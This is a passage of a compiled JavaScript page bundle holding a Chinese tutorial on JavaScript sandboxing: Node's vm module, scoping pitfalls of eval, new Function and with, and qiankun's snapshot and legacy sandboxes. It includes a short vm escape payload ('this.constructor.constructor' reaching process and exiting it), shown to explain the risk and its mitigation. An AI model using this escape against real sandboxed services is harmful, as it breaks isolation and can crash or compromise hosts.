sandbox);    \r\nconsole.log(sandbox.x); // 42    \r\nconsole.log(sandbox.y); // 17    \r\nconsole.log(x); // 1;   y is not defined.\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u200B	vm\u4E2D\u63D0\u4F9B\u4E86runInNewContext\u3001runInThisContext\u3001runInContext\u4E09\u4E2A\u65B9\u6CD5\uFF0C\u4E09\u8005\u7684\u7528\u6CD5\u6709\u4E2A\u522B\u51FA\u5165\uFF0C\u6BD4\u8F83\u5E38\u7528\u7684\u662FrunInNewContext\u548CrunInContext\uFF0C\u53EF\u4EE5\u4F20\u5165\u53C2\u6570\u6307\u5B9A\u597D\u4E0A\u4E0B\u6587\u5BF9\u8C61\u3002"}),"\n",(0,i.jsx)(e.p,{children:"\u200B	\u4F46\u662Fvm\u662F\u7EDD\u5BF9\u5B89\u5168\u7684\u5417\uFF1F\u4E0D\u4E00\u5B9A\u3002"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-javascript",children:"const vm = require('vm');    \r\nvm.runInNewContext(\"this.constructor.constructor('return process')().exit()\")\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u200B	 \u901A\u8FC7\u4E0A\u9762\u8FD9\u6BB5\u4EE3\u7801\uFF0C\u6211\u4EEC\u53EF\u4EE5\u901A\u8FC7vm\uFF0C\u505C\u6B62\u6389\u4E3B\u8FDB\u7A0Bnodejs\uFF0C\u5BFC\u81F4\u7A0B\u5E8F\u4E0D\u80FD\u7EE7\u7EED\u5F80\u4E0B\u6267\u884C\uFF0C\u8FD9\u662F\u6211\u4EEC\u4E0D\u5E0C\u671B\u7684\uFF0C\u89E3\u51B3\u65B9\u6848\u662F\u7ED1\u5B9A\u597Dcontext\u4E0A\u4E0B\u6587\u5BF9\u8C61\uFF0C\u540C\u65F6\uFF0C\u4E3A\u4E86\u907F\u514D\u901A\u8FC7\u539F\u578B\u94FE\u9003\u9038\uFF08nodejs\u4E2D\u7684\u5BF9\u8C61\u5E76\u6CA1\u6709\u50CF\u6D4F\u89C8\u5668\u7AEF\u4E00\u6837\u8FDB\u884C\u7ED3\u6784\u5316\u590D\u5236\uFF0C\u5BFC\u81F4\u539F\u578B\u94FE\u4F9D\u7136\u4FDD\u7559\uFF09\uFF0C\u6240\u4EE5\u6211\u4EEC\u9700\u8981\u5207\u65AD\u539F\u578B\u94FE\uFF0C\u540C\u65F6\u5BF9\u4E8E\u4F20\u5165\u7684\u66B4\u9732\u5BF9\u8C61\uFF0C\u53EA\u63D0\u4F9B\u57FA\u672C\u7C7B\u578B\u503C\u3002"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-javascript",children:"let ctx = Object.create(null);    \r\nctx.a = 1; // ctx\u4E0A\u4E0D\u80FD\u5305\u542B\u5F15\u7528\u7C7B\u578B\u7684\u5C5E\u6027    \r\nvm.runInNewContext(\"this.constructor.constructor('return process')().exit()\", ctx);\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u200B	\u8BA9\u6211\u4EEC\u6765\u770B\u4E00\u4E0BTSW\u4E2D\u662F\u600E\u4E48\u4F7F\u7528\u7684\uFF1A"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-javascript",children:"const vm = require('vm');    \r\nconst SbFunction = vm.runInNewContext('(Function)', Object.create(null));        // \u6C99\u5806    \r\n...    \r\nif (opt.jsonpCallback) {    \r\n  code = `var result=null; var ${opt.jsonpCallback}=function($1){result=$1}; ${responseText}; return result;`;    \r\n  obj = new SbFunction(code)();    \r\n}     \r\n...    \n"})}),"\n",(0,i.jsx)(e.p,{children:"\u200B	\u901A\u8FC7runInNewContext\u8FD4\u56DE\u6C99\u7BB1\u4E2D\u7684\u6784\u9020\u51FD\u6570Function\uFF0C\u540C\u65F6\u4F20\u5165\u5207\u65AD\u539F\u578B\u94FE\u7684\u7A7A\u5BF9\u8C61\u9632\u6B62\u9003\u9038\uFF0C\u4E4B\u540E\u518D\u5916\u90E8\u4F7F\u7528\u7684\u65F6\u5019\uFF0C\u53EA\u9700\u8981\u8C03\u7528\u8FD4\u56DE\u7684\u8FD9\u4E2A\u51FD\u6570\uFF0C\u548C\u666E\u901A\u7684new Function\u4E00\u6837\u8C03\u7528\u5373\u53EF\u3002"}),"\n",(0,i.jsx)(e.h2,{id:"\u6CE8\u610F",children:"\u6CE8\u610F"}),"\n",(0,i.jsx)(e.p,{children:"\u95ED\u5305\u65F6\u6709\u4E9B\u5185\u5BB9\u9700\u8981\u8FDB\u884C\u6CE8\u610F\uFF0C"}),"\n",(0,i.jsx)(e.h3,{id:"eval",children:"eval"}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"eval"})," \u6267\u884C\u7684\u4EE3\u7801\u53EF\u4EE5\u8BBF\u95EE\u95ED\u5305\u548C\u5168\u5C40\u8303\u56F4\uFF0C\u56E0\u6B64\u5C31\u5BFC\u81F4\u4E86\u4EE3\u7801\u6CE8\u5165\u7684\u5B89\u5168\u95EE\u9898\uFF0C\u56E0\u4E3A\u4EE3\u7801\u5185\u90E8\u53EF\u4EE5\u6CBF\u7740\u4F5C\u7528\u57DF\u94FE\u5F80\u4E0A\u627E\uFF0C\u7BE1\u6539\u5168\u5C40\u53D8\u91CF\uFF0C\u8FD9\u4E0D\u662F\u6211\u4EEC\u5E0C\u671B\u7684"]}),"\n",(0,i.jsx)(e.h3,{id:"new-function",children:"new Function"}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"new Function"})," \u4E2D\u4E5F\u5B58\u5728\u7C7B\u4F3C\u7684\u95EE\u9898\u3002"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-javascript",children:"const sum = new Function('a', 'b', 'return a + b');\r\nconsole.log(sum(1, 2));//3\r\nvar a = 1;\r\n\r\nfunction sandbox() {\r\n    var a = 2;\r\n    return new Function('return a;'); // \u8FD9\u91CC\u7684 a \u6307\u5411\u6700\u4E0A\u9762\u5168\u5C40\u4F5C\u7528\u57DF\u5185\u7684 1\uFF0C\u4E0D\u662F\u4F5C\u7528\u57DF\u5185\u7684 2\uFF0C\u8FDD\u53CD\u6C99\u76D2\u7684\u8BBE\u8BA1\u8981\u6C42\r\n}\r\nvar f = sandbox();\r\nconsole.log(f())\n"})}),"\n",(0,i.jsx)(e.p,{children:"Function \u521B\u5EFA\u7684\u51FD\u6570\u53EA\u80FD\u5728\u5168\u5C40\u4F5C\u7528\u57DF\u4E2D\u8FD0\u884C\u3002\u5B83\u65E0\u6CD5\u8BBF\u95EE\u5C40\u90E8\u95ED\u5305\u53D8\u91CF\uFF0C\u5B83\u4EEC\u603B\u662F\u88AB\u521B\u5EFA\u4E8E\u5168\u5C40\u73AF\u5883\uFF0C\u56E0\u6B64\u5728\u8FD0\u884C\u65F6\u5B83\u4EEC\u53EA\u80FD\u8BBF\u95EE\u5168\u5C40\u53D8\u91CF\u548C\u81EA\u5DF1\u7684\u5C40\u90E8\u53D8\u91CF\uFF0C\u4E0D\u80FD\u8BBF\u95EE\u5B83\u4EEC\u88AB Function \u6784\u9020\u5668\u521B\u5EFA\u65F6\u6240\u5728\u7684\u4F5C\u7528\u57DF\u7684\u53D8\u91CF\uFF1B\u4F46\u662F\uFF0C\u5B83\u4ECD\u7136\u53EF\u4EE5\u8BBF\u95EE\u5168\u5C40\u8303\u56F4\u3002"}),"\n",(0,i.jsx)(e.h3,{id:"with",children:"with"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-js",children:"function sandbox(o) {\r\n  with (o){\r\n    c=2;\r\n    d=3;\r\n    console.log(a,b,c,d); // 0,1,2,3 // \u6BCF\u4E2A\u53D8\u91CF\u9996\u5148\u88AB\u8BA4\u4E3A\u662F\u4E00\u4E2A\u5C40\u90E8\u53D8\u91CF\uFF0C\u5982\u679C\u5C40\u90E8\u53D8\u91CF\u4E0E obj \u5BF9\u8C61\u7684\u67D0\u4E2A\u5C5E\u6027\u540C\u540D\uFF0C\u5219\u8FD9\u4E2A\u5C40\u90E8\u53D8\u91CF\u4F1A\u6307\u5411 obj \u5BF9\u8C61\u5C5E\u6027\r\n  }\r\n}\r\nvar f = {\r\n  a:0,\r\n  b:1\r\n}\r\nsandbox(f);       \r\nconsole.log(f);\r\nconsole.log(c,d); // 2,3  c\u3001d \u88AB\u6CC4\u9732\u5230 window \u5BF9\u8C61\u4E0A\u53EF\u4EE5\u5168\u5C40\u8BBF\u95EE\u4E86\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u5173\u952E\u5B57 ",(0,i.jsx)(e.code,{children:"with"})," \u5E26\u6765\u4E86\u5185\u5B58\u6CC4\u6F0F\uFF0C\u5982\u679C with \u5185\uFF08\u5757\u4F5C\u7528\u57DF\uFF09\u6709\u503C\uFF0C\u5C31\u4F1A\u5728 with \u5185\u5BFB\u627E\uFF0C\u5982\u679C\u6CA1\u6709"]}),"\n",(0,i.jsx)(e.p,{children:"\u5728\u975E\u4E25\u683C\u6A21\u5F0F\u4E0B\uFF0C\u4F1A\u81EA\u52A8\u5728\u5168\u5C40\u4F5C\u7528\u57DF\u521B\u5EFA\u4E00\u4E2A\u5168\u5C40\u53D8\u91CF"}),"\n",(0,i.jsx)(e.h3,{id:"in",children:"in"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-js",children:'var o = {  \r\n  a : 1,  \r\n  b : function() {}\r\n}\r\nconsole.log("a" in o);  //true\r\nconsole.log("b" in o);  //true\r\nconsole.log("c" in o);  //false\r\nconsole.log("valueOf" in o);  //\u8FD4\u56DEtrue\uFF0C\u7EE7\u627FObject\u7684\u539F\u578B\u65B9\u6CD5\r\nconsole.log("constructor" in o);  //\u8FD4\u56DEtrue\uFF0C\u7EE7\u627FObject\u7684\u539F\u578B\u5C5E\u6027\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u53EF\u4EE5\u901A\u8FC7 in \u95F4\u63A5\u8BFB\u53D6\u5230\u539F\u578B\u4E0A\u7684\u65B9\u6CD5\uFF0C\u548C\u5C5E\u6027"}),"\n",(0,i.jsx)(e.h2,{id:"\u6C99\u7BB1\u5B9E\u73B0",children:"\u6C99\u7BB1\u5B9E\u73B0"}),"\n",(0,i.jsx)(e.h3,{id:"proxy\u6C99\u7BB1",children:"Proxy\u6C99\u7BB1"}),"\n",(0,i.jsxs)(e.p,{children:["\u5047\u5982\u53EF\u4EE5\u505A\u5230\u5728\u4F7F\u7528",(0,i.jsx)(e.code,{children:"with"}),"\u5BF9\u4E8E\u5757\u5185\u7684\u6BCF\u4E2A\u53D8\u91CF\u8BBF\u95EE\u90FD\u9650\u5236\u5728\u6C99\u76D2\u6761\u4EF6\u4E0B\u8BA1\u7B97\u53D8\u91CF\uFF0C\u4ECE\u6C99\u76D2\u4E2D\u68C0\u7D22\u53D8\u91CF\u3002\u90A3\u4E48\u662F\u5426\u53EF\u4EE5\u5B8C\u7F8E\u7684\u89E3\u51B3JavaScript\u6C99\u7BB1\u673A\u5236\u3002"]}),"\n",(0,i.jsx)(e.h3,{id:"\u5FEB\u7167\u6C99\u7BB1",children:"\u5FEB\u7167\u6C99\u7BB1"}),"\n",(0,i.jsx)(e.p,{children:"qiankun \u7684 snapshotSandbox"}),"\n",(0,i.jsxs)(e.p,{children:["\u4E3B\u8981\u7528\u4E8E\u4E0D\u652F\u6301 Proxy \u7684\u4F4E\u7248\u672C\u6D4F\u89C8\u5668\uFF0C\u539F\u7406\u662F\u57FA\u4E8E",(0,i.jsx)(e.code,{children:"diff"}),"\u6765\u5B9E\u73B0\u7684,\u5728\u5B50\u5E94\u7528\u6FC0\u6D3B\u6216\u8005\u5378\u8F7D\u65F6\u5206\u522B\u53BB\u901A\u8FC7\u5FEB\u7167\u7684\u5F62\u5F0F\u8BB0\u5F55\u6216\u8FD8\u539F\u72B6\u6001\u6765\u5B9E\u73B0\u6C99\u7BB1\uFF0CsnapshotSandbox \u4F1A\u6C61\u67D3\u5168\u5C40 window\u3002"]}),"\n",(0,i.jsx)(e.h3,{id:"legacy\u6C99\u7BB1",children:"legacy\u6C99\u7BB1"}),"\n",(0,i.jsx)(e.p,{children:"\u9057\u4EA7\u6C99\u7BB1\uFF0C\u7528\u4E8E\u517C\u5BB9\u8001\u4EE3\u7801"}),"\n",(0,i.jsx)(e.p,{children:"qiankun \u6846\u67B6 singular \u6A21\u5F0F\u4E0B proxy \u6C99\u7BB1\u5B9E\u73B0"}),"\n",(0,i.jsx)(e.p,{children:"legacySandBox \u8FD8\u662F\u4F1A\u64CD\u4F5C window \u5BF9\u8C61\uFF0C\u4F46\u662F\u4ED6\u901A\u8FC7\u6FC0\u6D3B\u6C99\u7BB1\u65F6\u8FD8\u539F\u5B50\u5E94\u7528\u7684\u72B6\u6001\uFF0C\u5378\u8F7D\u65F6\u8FD8\u539F\u4E3B\u5E94\u7528\u7684\u72B6\u6001\u6765\u5B9E\u73B0\u6C99\u7BB1\u9694\u79BB,\u6027\u80FD\u6BD4\u5FEB\u7167\u6C99\u7BB1\u597D\u4E0D\u7528\u904D\u5386 window \u5BF9\u8C61\u3002"}),"\n",(0,i.jsx)(e.h3,{id:"css\u9694\u79BB",children:"CSS\u9694\u79BB"}),"\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsx)(e.li,{children:"CSS Module"}),"\n",(0,i.jsx)(e.li,{children:"namespace"}),"\n",(0,i.jsx)(e.li,{children:"Dynamic StyleSheet"}),"\n",(0,i.jsx)(e.li,{children:"css in js"}),"\n",(0,i.jsx)(e.li,{children:"Shadow DOM \u5E38\u89C1\u7684\u6211\u4EEC\u8FD9\u8FB9\u4E0D\u518D\u8D58\u8FF0\uFF0C\u8FD9\u91CC\u6211\u4EEC\u91CD\u70B9\u63D0\u4E00\u4E0BShadow DO\u3002"}),"\n"]}),"\n",(0,i.jsx)(e.h2,{id:"\u53C2\u8003\u6587\u7AE0",children:"\u53C2\u8003\u6587\u7AE0"}),"\n",(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:"\u4F5C\u8005"}),(0,i.jsx)(e.th,{children:"\u94FE\u63A5"})]})}),(0,i.jsx)(e.tbody,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:"\u888B\u9F20\u4E91\u6570\u6808UED\u56E2\u961F"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:"https://juejin.cn/post/6976828400572842014",children:"https://juejin.cn/post/6976828400572842014"})})]})})]})]})}function x(n={}){let{wrapper:e}={...(0,c.a)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(a,{...n})}):a(n)}},65:function(n,e,r){r.d(e,{Z:function(){return o},a:function(){return l}});var s=r(7294);let i={},c=s.createContext(i);function l(n){let e=s.useContext(c);return s.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:l(n.components),s.createElement(c.Provider,{value:e},n.children)}}}]);